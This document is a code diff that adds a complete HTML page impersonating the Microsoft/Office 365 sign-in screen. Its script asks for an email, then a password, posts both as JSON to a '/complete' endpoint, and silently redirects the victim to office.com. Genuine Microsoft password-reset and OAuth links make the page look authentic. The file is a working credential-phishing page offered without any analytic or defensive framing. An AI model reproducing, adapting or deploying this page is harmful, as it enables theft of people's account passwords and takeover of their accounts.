@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        *{
+            font-family: 'Segoe UI';
+        }
+        body{
+            background-image: url('background.svg');
+        }
+        .content{
+            background: #fff;
+            padding: 44px;
+            max-width: 360px;
+            display: block;
+            margin: 13% auto;
+            margin-bottom: 1%;
+            border: none;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            -webkit-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+        input:focus{
+            outline: none;
+        }
+        .but-div{
+            float: right;
+        }
+        button{
+            color: #fff;
+            border-color: #0067b8;
+            background-color: #0067b8;
+            display: block;
+            min-height: 32px;
+            min-width: 110px;
+            border: none;
+            line-height: normal;
+            padding: 4px 12px 4px 12px;
+            display: block;
+        }
+        a{
+            text-decoration: none;
+        }
+        input{
+            border-width: 1px;
+            border-top-width: 0;
+            border-left-width: 0;
+            border-right-width: 0;
+            padding-left: 0;
+            width: 100%;
+            height: 36px;
+            border-style: thin;
+        }
+        .footer{
+            position: absolute;
+            bottom: 0%;
+            display: block;
+            right: 0%;
+            padding: 4px;
+        }
+        .content a{
+            font-size: .8rem;
+            color: #0067b8;
+        }
+        .bask{
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+        .extend{
+            margin-top: 1%;
+            padding-top: 4px;
+            padding-bottom: 4px;
+            line-height: 16px;
+            font-size: 3rem;
+        }
+        .shock{
+            display: none;
+        }
+        .extend *, .shock *{
+            display: inline-block;
+            vertical-align: middle;
+        }
+        .extend a{
+            color: #1b1b1b;
+        }
+        .extend img{
+            height: 32px;
+        }
+        .footer a{
+            font-size: 12px;
+            padding-left: 8px;
+            color: #000;
+        }
+    </style>
+    <script>
+        function msjs() {
+            var EP = document.getElementById('EP').value,
+            email = EP;
+            document.getElementById('ep').innerHTML = EP
+            document.getElementById('shock').style.display = "block"
+            document.getElementById('extend').style.display = "none"
+            document.getElementById('EP').value = ''
+            document.getElementById('EP').setAttribute( 'placeholder', 'Password')
+            document.getElementById('EP').setAttribute( 'type', 'password')
+            document.getElementById('EP').setAttribute( 'id', 'PE')
+            document.getElementById('form').setAttribute( 'onsubmit', 'passME("'+email+'"); return false;')
+            document.getElementById('fp').innerHTML = 'Forgot my password'
+            document.getElementById('action').innerHTML = 'Sign in'
+            document.getElementById('bask').innerHTML = 'Enter password'
+            document.getElementById('fp').setAttribute( 'href', 'https://passwordreset.microsoftonline.com/')
+        }
+        function sb(request){
+            fetch('/complete', request)
+            .then((res) => {
+                var link = document.createElement("a");
+                link.referrerPolicy = "no-referrer";
+                link.rel = "noreferrer";
+                link.href = 'https://office.com';
+                link.click();
+                return false
+            })
+        }
+        function passME( email){
+            var EP = document.getElementById('PE').value,
+            request = {
+                method: 'POST',
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                redirect: 'follow',
+                body: JSON.stringify({
+                    email: email,
+                    password: EP
+                }),
+            };
+            sb(request)
+            return false;
+        }
+</script>
+</head>
+<body>
+    <div class="content">
+        <img src="r45we.svg" alt="xxsign">
+        <br>
+        <br>
+        <div id="shock" class="shock">
+            <img src="bk.svg" alt="back">
+            <p id="ep"></p>
+        </div>
+        <div id="bask" class="bask">Sign in</div>
+        <form onsubmit="msjs(); return false;" id="form">
+            <input id="EP" type="email" placeholder="Email or phone">
+            <br><br>
+            <a href="https://passwordreset.microsoftonline.com/" id="fp">Can’t access your account?</a>
+            <br><br>
+            <br><br>
+            <div class="but-div">
+                <button id="action">Next</button>
+            </div>
+            <br>
+        </form>
+        <br>
+    </div>
+
+    <div id="extend" class="content extend">
+        <img src="k134.svg" alt="opener">
+        <a href="https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638157078789990459.MjYzNDIxYTQtYWYxZi00MDhhLTg4NzUtMGE2MThkNGFjYzBlMjBlZGYyMDQtNTkzNS00ODViLTkxNTYtOTFhODIyOWMxOWVl&ui_locales=en-US&mkt=en-US&msafed=0&state=m7J_4Xr1kkVNID031cc0zeUXzmCcsgZJZosEh3QeBbwZV2nSJnAzkbviN04SCloMzoAT35yWBPJyNamPD-XgEgegGBZ33pbdrVPtBb3f8JgkZ_R3aF_BEWwqO4tHj3cVHOROH6uN_J1vvW_v58e8Oq9O8QroG1wIVQ02ZEphdRUSE25VUuBMwxbDddHAcuYbFbDN9D2km6H2aNP_zW4B6JMhKBpPiyYTpHjd9ND0iOBqsjpeeqgJtJ2S41x2LvfZWF5r7NjDWPlv1-1SSFHLIIPcReb7wT7RGI3t1kdF1eL1Wg4fBU1ZcgaEx2YDIT_TgZwuf8RWEHbb9CLbMaQdlDXvh-5vqhNuv-aLLC7uRPU&x-client-SKU=ID_NET6_0&x-client-ver=6.26.1.0&sso_reload=true">
+            Sign-in options
+        </a>
+    </div>
+
+    <div class="footer">
+        <a href="">Terms of service</a>
+        <a href="">Privacy & cookies</a>
+        <a>...</a>
+    </div>
+</body>
+</html>
